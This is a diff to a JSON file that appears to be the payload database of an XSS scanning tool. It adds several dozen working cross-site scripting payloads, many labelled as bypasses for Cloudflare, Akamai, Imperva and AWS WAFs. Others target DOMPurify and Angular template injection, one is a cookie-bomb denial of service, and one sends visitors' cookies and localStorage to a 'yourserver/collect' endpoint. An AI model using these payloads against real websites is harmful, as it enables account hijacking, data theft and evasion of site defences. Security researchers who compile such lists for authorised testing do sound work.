@@ -2743,5 +2743,1057 @@
     "count": 0,
     "description": "Ultra advanced bypassed payload",
     "level": "critical"
+  },
+  {
+    "Payload": "<input type=\"checkbox\" id=\"z\" value=\"xss0r\" style=\"display:none\" &%2362;=\"\" onchange=\"top[['alert'][0]](location.hostname);this.remove()\"><label for=\"z\" style=\"position:fixed;inset:0;cursor:crosshair\"></label>",
+    "Attribute": [
+      "\"",
+      "'",
+      "(",
+      ")",
+      "[",
+      "]",
+      ";",
+      ":",
+      "=",
+      ">",
+      "<",
+      "&",
+      "%"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Advanced UI hijacking with stealth checkbox overlay, bracket notation evasion, and HTML entity encoding",
+    "level": "critical"
+  },
+  {
+    "Payload": "<xss onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:50px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>",
+    "Attribute": [
+      "<",
+      ">",
+      "(",
+      ")",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "#"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Chrome/Firefox onscrollend event with auto-scroll trigger - bypasses click-based restrictions",
+    "level": "critical"
+  },
+  {
+    "Payload": "%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A",
+    "Attribute": [
+      "%",
+      "0",
+      "A",
+      "3",
+      ":",
+      "5",
+      "B",
+      "'",
+      "2",
+      "7",
+      "8",
+      "D",
+      "(",
+      ")",
+      "/",
+      ";"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "URL-encoded javascript: protocol with string concatenation - advanced WAF bypass",
+    "level": "critical"
+  },
+  {
+    "Payload": "<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      ",",
+      "=",
+      "+",
+      "[",
+      "]",
+      "(",
+      ")",
+      ";"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Advanced throw/onerror technique with URL string manipulation and eval injection",
+    "level": "critical"
+  },
+  {
+    "Payload": "<svg/onload='const url = `https://yourserver/collect?cookie=${encodeURIComponent(document.cookie)}&localStorage=${encodeURIComponent(JSON.stringify(localStorage))}`; fetch(url);'\">",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      "=",
+      "'",
+      "`",
+      ":",
+      "?",
+      "&",
+      "$",
+      "{",
+      "}",
+      "(",
+      ")",
+      ";",
+      "\""
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Advanced data exfiltration payload - steals cookies and localStorage via fetch API",
+    "level": "critical"
+  },
+  {
+    "Payload": "\"><BODy onbeforescriptexecute=\"x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\\u006d('+'document'+'.'+x1+c\">",
+    "Attribute": [
+      "\"",
+      ">",
+      "<",
+      "=",
+      "'",
+      ";",
+      "+",
+      ":",
+      "\\",
+      "u",
+      "0",
+      "6",
+      "d",
+      "(",
+      ")",
+      "."
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "onbeforescriptexecute event with location redirection and unicode escape sequences",
+    "level": "critical"
+  },
+  {
+    "Payload": "<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>",
+    "Attribute": [
+      "<",
+      ">",
+      "%",
+      "2",
+      "0",
+      "=",
+      "(",
+      ")"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "HTML popover API with onbeforetoggle event - cutting-edge browser feature exploitation",
+    "level": "critical"
+  },
+  {
+    "Payload": "{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}",
+    "Attribute": [
+      "{",
+      "}",
+      "(",
+      ")",
+      "[",
+      "]",
+      ".",
+      "=",
+      ";",
+      "$",
+      ",",
+      "'"
+    ],
+    "waf": "akamai",
+    "count": 0,
+    "description": "Angular 1.4.3 CSTI payload with constructor manipulation and fromCodePoint encoding",
+    "level": "critical"
+  },
+  {
+    "Payload": "%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",
+    "Attribute": [
+      "%",
+      "2",
+      "\"",
+      "=",
+      "[",
+      "]",
+      "'",
+      "B",
+      "+",
+      "(",
+      ")",
+      ",",
+      "0",
+      ";",
+      "7"
+    ],
+    "waf": "akamai",
+    "count": 0,
+    "description": "Akamai WAF bypass using array indexing and string concatenation with URL encoding",
+    "level": "critical"
+  },
+  {
+    "Payload": "<details open ontoggle=\"{alert`1`}\"></details>",
+    "Attribute": [
+      "<",
+      ">",
+      "\"",
+      "{",
+      "}",
+      "`",
+      "(",
+      ")",
+      "/"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "HTML5 details element with ontoggle event and template literals",
+    "level": "high"
+  },
+  {
+    "Payload": "<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>",
+    "Attribute": [
+      "<",
+      ">",
+      "%",
+      "0",
+      "a",
+      "3",
+      "d",
+      "=",
+      ",",
+      "(",
+      ")",
+      "2"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass using case mixing, URL encoding and comma operator",
+    "level": "critical"
+  },
+  {
+    "Payload": "<a\"/onclick=(confirm)(origin)>Click Here!",
+    "Attribute": [
+      "<",
+      ">",
+      "\"",
+      "/",
+      "=",
+      "(",
+      ")",
+      "!"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare WAF bypass with malformed attributes and parentheses wrapping",
+    "level": "critical"
+  },
+  {
+    "Payload": "<svg%0Aonauxclick=0;[1].some(confirm)//",
+    "Attribute": [
+      "<",
+      ">",
+      "%",
+      "0",
+      "A",
+      "=",
+      ";",
+      "[",
+      "]",
+      ".",
+      "(",
+      ")",
+      "/",
+      "1"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "SVG with onauxclick event and Array.some() method abuse",
+    "level": "critical"
+  },
+  {
+    "Payload": "<marquee+loop=1+width=0+onfinish='new+Function`al\\ert\\`1\\``'>",
+    "Attribute": [
+      "<",
+      ">",
+      "+",
+      "=",
+      "1",
+      "0",
+      "'",
+      "`",
+      "\\",
+      "a",
+      "l",
+      "e",
+      "r",
+      "t"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Marquee element with Function constructor and template literal escaping",
+    "level": "high"
+  },
+  {
+    "Payload": "confirm?.(1)",
+    "Attribute": [
+      "(",
+      ")",
+      "?",
+      ".",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "KnoxSS payload using optional chaining operator - minimal and effective",
+    "level": "medium"
+  },
+  {
+    "Payload": "Function(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\")()",
+    "Attribute": [
+      "(",
+      ")",
+      "\"",
+      "\\",
+      "x",
+      "6",
+      "1",
+      "c",
+      "5",
+      "2",
+      "7",
+      "4",
+      "8",
+      "3",
+      "9"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Function constructor with hexadecimal encoding - bypasses string detection",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>:target {color:red;}</style><a id=x style=\"transition:color 1s\" ontransitionstart=alert(1)></a>",
+    "Attribute": [
+      "<",
+      ">",
+      ":",
+      "{",
+      "}",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "#"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "CSS :target pseudo-class with transition event - automatic trigger without user interaction",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes slidein {}</style><a style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "s",
+      "2"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "CSS keyframes animation with webkit iteration event - bypasses interaction-based restrictions",
+    "level": "critical"
+  },
+  {
+    "Payload": "<a onbeforescriptexecute=alert(1)><script>1</script>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Script execution lifecycle event - triggers before script runs",
+    "level": "high"
+  },
+  {
+    "Payload": "<a onafterscriptexecute=alert(1)><script>1</script>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Script execution lifecycle event - triggers after script completes",
+    "level": "high"
+  },
+  {
+    "Payload": "<style>@keyframes x{}</style><a style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "x"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "CSS keyframes with webkit animation start event - automatic trigger",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes x{}</style><a style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "x"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "CSS keyframes with webkit animation end event - triggers when animation completes",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"print()\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "0",
+      "1",
+      "s",
+      "x",
+      "-",
+      "#"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Complex CSS animation with positioning and cancel event - advanced animation manipulation",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes x{}</style><a style=\"animation-name:x\" onanimationend=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "x"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Standard CSS animation end event (non-webkit) - cross-browser compatibility",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes slidein {}</style><a style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "s",
+      "2"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Standard CSS animation iteration event (non-webkit) - triggers on each animation cycle",
+    "level": "critical"
+  },
+  {
+    "Payload": "12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img",
+    "Attribute": [
+      "<",
+      ">",
+      "(",
+      ")",
+      ".",
+      "%",
+      "2",
+      "F",
+      "1",
+      "2",
+      "3",
+      "4",
+      "5",
+      "-",
+      "a",
+      "b",
+      "c",
+      "6"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Nested script tag bypass with filename disguise - confuses WAF parsers with overlapping tags",
+    "level": "critical"
+  },
+  {
+    "Payload": "<scr<script>ipt>alert(1)</scr<script>ipt>",
+    "Attribute": [
+      "<",
+      ">",
+      "(",
+      ")",
+      "/",
+      "1"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Simple nested script tag bypass - basic form of tag confusion attack",
+    "level": "critical"
+  },
+  {
+    "Payload": "<img<img src=x onerror=alert(1)> src=x onerror=alert(2)>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      " ",
+      "1",
+      "2",
+      "x"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Nested img tag bypass - double payload execution with tag confusion",
+    "level": "critical"
+  },
+  {
+    "Payload": "<svg<svg onload=alert(1)> onload=alert(2)>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      " ",
+      "1",
+      "2"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Nested SVG tag bypass - dual execution with overlapping element confusion",
+    "level": "critical"
+  },
+  {
+    "Payload": "<<script>alert('nested')</script>",
+    "Attribute": [
+      "<",
+      ">",
+      "(",
+      ")",
+      "'",
+      "/"
+    ],
+    "waf": "basic",
+    "count": 0,
+    "description": "Double bracket script bypass - simple tag confusion for basic filters",
+    "level": "high"
+  },
+  {
+    "Payload": "<scr<iframe src=javascript:alert(1)></iframe>ipt>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      ":",
+      "(",
+      ")",
+      "/",
+      "1"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Mixed nested tags bypass - iframe within broken script tag structure",
+    "level": "critical"
+  },
+  {
+    "Payload": "<img//////src=x oNlY=1 oNerror=alert('xss')//",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      "=",
+      "(",
+      ")",
+      "'",
+      "1"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass with excessive slashes and mixed case attributes",
+    "level": "critical"
+  },
+  {
+    "Payload": "<img src=x on onerror=alert()>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      " "
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass with space-separated 'on' keyword before onerror",
+    "level": "critical"
+  },
+  {
+    "Payload": "<img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      "=",
+      "(",
+      ")",
+      "%",
+      "0",
+      "A",
+      "1"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass using newline characters (%0A) to separate attributes",
+    "level": "critical"
+  },
+  {
+    "Payload": "<svg onload=prompt%26%230000000040document.domain)>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "%",
+      "2",
+      "6",
+      "3",
+      "0",
+      "4",
+      "(",
+      ")",
+      "."
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass using zero-padded HTML entities for parentheses",
+    "level": "critical"
+  },
+  {
+    "Payload": "<a\"/onclick=(confirm)()>Click Here!",
+    "Attribute": [
+      "<",
+      ">",
+      "\"",
+      "/",
+      "=",
+      "(",
+      ")",
+      "!"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare href bypass with malformed quote and function wrapping",
+    "level": "critical"
+  },
+  {
+    "Payload": "<details open id=\"' &quot;'\"ontoggle=[JS]>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "\"",
+      "'",
+      "&",
+      "q",
+      "u",
+      "o",
+      "t",
+      ";",
+      "[",
+      "]"
+    ],
+    "waf": "akamai",
+    "count": 0,
+    "description": "Akamai bypass using mixed quotes and HTML entities in id attribute",
+    "level": "critical"
+  },
+  {
+    "Payload": "<math><edra href=Ja&Tab;vascript&colon;console.error(1)>HERE</edra></math>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "&",
+      "T",
+      "a",
+      "b",
+      ";",
+      ":",
+      "(",
+      ")",
+      "1",
+      "/"
+    ],
+    "waf": "akamai",
+    "count": 0,
+    "description": "Akamai bypass using MathML with Tab entity and colon entity in javascript protocol",
+    "level": "critical"
+  },
+  {
+    "Payload": "<details/open/id=\"&quot;\"ontoggle=[JS]>",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      "=",
+      "\"",
+      "&",
+      "q",
+      "u",
+      "o",
+      "t",
+      ";",
+      "[",
+      "]"
+    ],
+    "waf": "imperva",
+    "count": 0,
+    "description": "Imperva/Incapsula bypass with escaped quotes and details element",
+    "level": "critical"
+  },
+  {
+    "Payload": "?id=\"&id=onpointerrawupdate=\"a=confirm&id=a(1)",
+    "Attribute": [
+      "?",
+      "=",
+      "\"",
+      "&",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Chrome-specific onpointerrawupdate event with parameter pollution technique",
+    "level": "high"
+  },
+  {
+    "Payload": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "\"",
+      ":",
+      ";",
+      ",",
+      "/",
+      "+"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Base64 encoded script in data URL - bypasses content filters",
+    "level": "high"
+  },
+  {
+    "Payload": "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;\">",
+    "Attribute": [
+      "<",
+      ">",
+      "\"",
+      "-",
+      "&",
+      "g",
+      "t",
+      ";",
+      "l",
+      "T",
+      "a",
+      "b",
+      "=",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "DOMPurify <2.1 bypass using MathML with nested table and style injection",
+    "level": "critical"
+  },
+  {
+    "Payload": "ws://google.com\"><svg/onload=alert(2)>",
+    "Attribute": [
+      ":",
+      "/",
+      "\"",
+      ">",
+      "<",
+      "=",
+      "(",
+      ")",
+      "2"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "WebSocket URL 302 redirect XSS - exploits Firefox redirect handling",
+    "level": "high"
+  },
+  {
+    "Payload": "[1].forEach(alert)",
+    "Attribute": [
+      "[",
+      "]",
+      ".",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Parentheses-free alert execution using Array.forEach method",
+    "level": "medium"
+  },
+  {
+    "Payload": "setTimeout`alert\\u0028document.domain\\u0029`",
+    "Attribute": [
+      "`",
+      "\\",
+      "u",
+      "0",
+      "2",
+      "8",
+      "9",
+      ".",
+      "("
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Template literal setTimeout with unicode escapes - bypasses parentheses filters",
+    "level": "high"
+  },
+  {
+    "Payload": "constructor.constructor(\"aler\"+\"t(3)\")();",
+    "Attribute": [
+      ".",
+      "(",
+      ")",
+      "\"",
+      "+",
+      "3",
+      ";"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Constructor chaining for Function creation - bypasses direct eval/Function detection",
+    "level": "high"
+  },
+  {
+    "Payload": "top[8680439..toString(30)](7);",
+    "Attribute": [
+      "[",
+      "]",
+      ".",
+      "(",
+      ")",
+      "8",
+      "6",
+      "0",
+      "4",
+      "3",
+      "9",
+      "3",
+      "7",
+      ";"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Numeric base conversion to spell 'alert' - advanced obfuscation technique",
+    "level": "high"
+  },
+  {
+    "Payload": "top[/al/.source+/ert/.source](8);",
+    "Attribute": [
+      "[",
+      "]",
+      "/",
+      ".",
+      "+",
+      "(",
+      ")",
+      "8",
+      ";"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Regex source concatenation for 'alert' - bypasses string detection",
+    "level": "high"
+  },
+  {
+    "Payload": "<!--javascript --><img src=x onerror=alert(1)>",
+    "Attribute": [
+      "<",
+      "!",
+      "-",
+      ">",
+      "=",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "HTML comment injection context bypass - exploits comment parsing",
+    "level": "high"
+  },
+  {
+    "Payload": "\"+alert(45)+\"",
+    "Attribute": [
+      "\"",
+      "+",
+      "(",
+      ")",
+      "4",
+      "5"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "JavaScript string context escape with concatenation - breaks out of quotes",
+    "level": "medium"
+  },
+  {
+    "Payload": "\\\\u006A\\\\u0061\\\\u0076\\\\u0061\\\\u0073\\\\u0063\\\\u0072\\\\u0069\\\\u0070\\\\u0074\\\\u003A\\\\u0061\\\\u006C\\\\u0065\\\\u0072\\\\u0074\\\\u0028\\\\u0027\\\\u0058\\\\u0053\\\\u0053\\\\u0027\\\\u0029",
+    "Attribute": [
+      "\\",
+      "u",
+      "0",
+      "6",
+      "A",
+      "1",
+      "7",
+      "3",
+      "2",
+      "9",
+      "C",
+      "5",
+      "8",
+      "4",
+      ":",
+      "("
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Double-escaped unicode for 'javascript:alert(XSS)' - bypasses unicode filters",
+    "level": "high"
+  },
+  {
+    "Payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script>alert('AWS_WAF_BYPASS')</script>",
+    "Attribute": [
+      "A",
+      "<",
+      ">",
+      "(",
+      ")",
+      "'",
+      "_",
+      "/",
+      ";"
+    ],
+    "waf": "aws",
+    "count": 0,
+    "description": "AWS WAF bypass using 8192+ character prefix - exploits request body inspection limit",
+    "level": "critical"
+  },
+  {
+    "Payload": "for (let i = 0; i < 500; i++) { var a = 'A'.repeat(500); document.cookie = `${i}=${a}`; }",
+    "Attribute": [
+      "(",
+      ")",
+      "{",
+      "}",
+      ";",
+      "'",
+      ".",
+      "=",
+      "`",
+      "$",
+      "<",
+      ">"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Cookie bomb DoS attack - creates 500 large cookies to overwhelm browser/server",
+    "level": "high"
   }
 ]
